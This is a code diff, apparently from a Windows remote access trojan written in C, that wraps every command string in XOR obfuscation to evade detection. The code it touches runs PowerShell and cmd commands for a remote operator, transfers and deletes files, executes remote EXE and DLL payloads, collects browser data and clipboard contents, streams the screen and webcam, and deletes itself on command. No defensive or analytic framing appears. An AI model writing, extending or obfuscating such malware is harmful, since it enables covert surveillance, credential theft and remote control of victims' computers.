@@ -32,12 +32,12 @@ void handle_command(void* arg) {
     CommandArgs* ca = (CommandArgs*)arg;
     char* cmd = ca->cmd;
 
-    if (strcmp(cmd, "ping") == 0) {
-        sock_send_ex(g_sock, g_send_mutex, "pong", "");
-    } else if (strncmp(cmd, "[msg] ", 6) == 0) {
-        MessageBoxA(NULL, cmd + 6, "Message", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
-        sock_send(g_sock, g_send_mutex, "ok");
-    } else if (strncmp(cmd, "[exec_ps]", 9) == 0) {
+    if (strcmp(cmd, xor_str(_S("ping"))) == 0) {
+        sock_send_ex(g_sock, g_send_mutex, xor_str(_S("pong")), "");
+    } else if (strncmp(cmd, xor_str(_S("[msg] ")), 6) == 0) {
+        MessageBoxA(NULL, cmd + 6, xor_str(_S("Message")), MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+        sock_send(g_sock, g_send_mutex, xor_str(_S("ok")));
+    } else if (strncmp(cmd, xor_str(_S("[exec_ps]")), 9) == 0) {
         char* out = run_powershell(cmd + 9);
         char* saveptr;
         char* line = strtok_r(out, "\n", &saveptr);
@@ -48,68 +48,68 @@ void handle_command(void* arg) {
             line = strtok_r(NULL, "\n", &saveptr);
         }
         free(out);
-    } else if (strncmp(cmd, "[exec_cmd]", 10) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[exec_cmd]")), 10) == 0) {
         char* out = run_cmd(cmd + 10);
         char* saveptr;
         char* line = strtok_r(out, "\n", &saveptr);
         while (line) {
             char buf[4096];
-            _snprintf(buf, sizeof(buf), "[cmd_output]%s", line);
+            _snprintf(buf, sizeof(buf), xor_str(_S("[cmd_output]%s")), line);
             sock_send(g_sock, g_send_mutex, buf);
             line = strtok_r(NULL, "\n", &saveptr);
         }
         free(out);
-    } else if (strcmp(cmd, "[screen_stop]") == 0) {
+    } else if (strcmp(cmd, xor_str(_S("[screen_stop]"))) == 0) {
         if (g_screen_stop) SetEvent(g_screen_stop);
-    } else if (strcmp(cmd, "[cam_stop]") == 0) {
+    } else if (strcmp(cmd, xor_str(_S("[cam_stop]"))) == 0) {
         if (g_camera_stop) SetEvent(g_camera_stop);
-    } else if (strcmp(cmd, "[tasklist]") == 0) {
+    } else if (strcmp(cmd, xor_str(_S("[tasklist]"))) == 0) {
         handle_tasklist(g_sock, g_send_mutex);
-    } else if (strncmp(cmd, "[taskkill]", 10) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[taskkill]")), 10) == 0) {
         handle_taskkill(g_sock, g_send_mutex, cmd + 10);
-    } else if (strncmp(cmd, "[ls]", 4) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[ls]")), 4) == 0) {
         handle_ls(g_sock, g_send_mutex, cmd + 4);
-    } else if (strncmp(cmd, "[download]", 10) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[download]")), 10) == 0) {
         handle_download(g_sock, g_send_mutex, cmd + 10);
-    } else if (strncmp(cmd, "[delete]", 8) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[delete]")), 8) == 0) {
         handle_delete(g_sock, g_send_mutex, cmd + 8);
-    } else if (strncmp(cmd, "[mkdir]", 7) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[mkdir]")), 7) == 0) {
         handle_mkdir(g_sock, g_send_mutex, cmd + 7);
-    } else if (strncmp(cmd, "[upload]", 8) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[upload]")), 8) == 0) {
         handle_upload(g_sock, g_send_mutex, cmd + 8);
-    } else if (strncmp(cmd, "[rename]", 8) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[rename]")), 8) == 0) {
         handle_rename(g_sock, g_send_mutex, cmd + 8);
-    } else if (strncmp(cmd, "[rfe_exe]", 9) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[rfe_exe]")), 9) == 0) {
         handle_rfe_exe(g_sock, g_send_mutex, cmd + 9);
-    } else if (strncmp(cmd, "[rfe_dll]", 9) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[rfe_dll]")), 9) == 0) {
         handle_rfe_dll(g_sock, g_send_mutex, cmd + 9);
-    } else if (strncmp(cmd, "[browser_collect]", 17) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[browser_collect]")), 17) == 0) {
         collect_browser_data(cmd + 17, g_sock, g_send_mutex);
-    } else if (strcmp(cmd, "[clipboard_get]") == 0) {
+    } else if (strcmp(cmd, xor_str(_S("[clipboard_get]"))) == 0) {
         handle_clipboard_get(g_sock, g_send_mutex);
-    } else if (strncmp(cmd, "[clipboard_set]", 15) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[clipboard_set]")), 15) == 0) {
         handle_clipboard_set(g_sock, g_send_mutex, cmd + 15);
-    } else if (strcmp(cmd, "[uninstall]") == 0) {
+    } else if (strcmp(cmd, xor_str(_S("[uninstall]"))) == 0) {
         /* Kendi kendini sil ve kapat */
         char self_path[MAX_PATH] = {0};
         GetModuleFileNameA(NULL, self_path, MAX_PATH);
         char cmd_line[MAX_PATH + 64];
         _snprintf(cmd_line, sizeof(cmd_line),
-            "cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"", self_path);
+            xor_str(_S("cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"")), self_path);
         STARTUPINFOA si = {0}; si.cb = sizeof(si);
         PROCESS_INFORMATION pi = {0};
         CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE,
             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
         closesocket(g_sock);
         ExitProcess(0);
-    } else if (strcmp(cmd, "[close]") == 0) {
+    } else if (strcmp(cmd, xor_str(_S("[close]"))) == 0) {
         closesocket(g_sock);
         ExitProcess(0);
-    } else if (strcmp(cmd, "[reconnect]") == 0) {
+    } else if (strcmp(cmd, xor_str(_S("[reconnect]"))) == 0) {
         closesocket(g_sock);
         /* g_sock = INVALID_SOCKET causes main recv loop to exit, triggering reconnect */
         g_sock = INVALID_SOCKET;
-    } else if (strncmp(cmd, "[set_delay]", 11) == 0) {
+    } else if (strncmp(cmd, xor_str(_S("[set_delay]")), 11) == 0) {
         int delay = atoi(cmd + 11);
         if (delay > 0) g_reconnect_delay = delay;
     }
@@ -181,10 +181,10 @@ int main() {
         char* encrypted_hs = rsa_encrypt_pkcs1(session_data, 48, RSA_PUB_KEY);
         if (encrypted_hs) {
             cJSON* hs_root = cJSON_CreateObject();
-            cJSON_AddStringToObject(hs_root, "session", encrypted_hs);
+            cJSON_AddStringToObject(hs_root, xor_str(_S("session")), encrypted_hs);
             char* hs_json = cJSON_PrintUnformatted(hs_root);
             char hs_buf[2048];
-            _snprintf(hs_buf, sizeof(hs_buf), "%s\n", hs_json);
+            _snprintf(hs_buf, sizeof(hs_buf), xor_str(_S("%s\n")), hs_json);
             send(g_sock, hs_buf, (int)strlen(hs_buf), 0);
             free(hs_json);
             cJSON_Delete(hs_root);
@@ -192,7 +192,7 @@ int main() {
         }
 
         char sysinfo_msg[4096];
-        _snprintf(sysinfo_msg, sizeof(sysinfo_msg), "[sysinfo]%s", info);
+        _snprintf(sysinfo_msg, sizeof(sysinfo_msg), xor_str(_S("[sysinfo]%s")), info);
         sock_send(g_sock, g_send_mutex, sysinfo_msg);
 
         char buf[8192];
@@ -204,8 +204,8 @@ int main() {
             while (line) {
                 cJSON* packet = cJSON_Parse(line);
                 if (packet) {
-                    cJSON* data = cJSON_GetObjectItem(packet, "data");
-                    cJSON* iv_b64 = cJSON_GetObjectItem(packet, "iv");
+                    cJSON* data = cJSON_GetObjectItem(packet, xor_str(_S("data")));
+                    cJSON* iv_b64 = cJSON_GetObjectItem(packet, xor_str(_S("iv")));
                     if (data && iv_b64) {
                         size_t iv_len;
                         unsigned char* iv = base64_decode(iv_b64->valuestring, strlen(iv_b64->valuestring), &iv_len);
@@ -215,14 +215,14 @@ int main() {
                             decrypted[plain_len] = 0;
                             cJSON* msg = cJSON_Parse((char*)decrypted);
                             if (msg) {
-                                cJSON* type = cJSON_GetObjectItem(msg, "type");
-                                cJSON* payload = cJSON_GetObjectItem(msg, "payload");
-                                if (type && strcmp(type->valuestring, "ping") == 0) {
-                                    sock_send_ex(g_sock, g_send_mutex, "pong", "");
-                                } else if (type && strcmp(type->valuestring, "command") == 0 && payload) {
+                                cJSON* type = cJSON_GetObjectItem(msg, xor_str(_S("type")));
+                                cJSON* payload = cJSON_GetObjectItem(msg, xor_str(_S("payload")));
+                                if (type && strcmp(type->valuestring, xor_str(_S("ping"))) == 0) {
+                                    sock_send_ex(g_sock, g_send_mutex, xor_str(_S("pong")), "");
+                                } else if (type && strcmp(type->valuestring, xor_str(_S("command"))) == 0 && payload) {
                                     char* cmd_val = payload->valuestring;
 
-                                    if (strncmp(cmd_val, "[screen_start]", 14) == 0) {
+                                    if (strncmp(cmd_val, xor_str(_S("[screen_start]")), 14) == 0) {
                                         int fps = atoi(cmd_val + 14);
                                         if (g_screen_stop) {
                                             SetEvent(g_screen_stop);
@@ -233,7 +233,7 @@ int main() {
                                         StreamArgs* sa = malloc(sizeof(StreamArgs));
                                         sa->fps = fps;
                                         _beginthread(screen_thread, 0, sa);
-                                    } else if (strncmp(cmd_val, "[cam_start]", 11) == 0) {
+                                    } else if (strncmp(cmd_val, xor_str(_S("[cam_start]")), 11) == 0) {
                                         int fps = atoi(cmd_val + 11);
                                         if (g_camera_stop) {
                                             SetEvent(g_camera_stop);
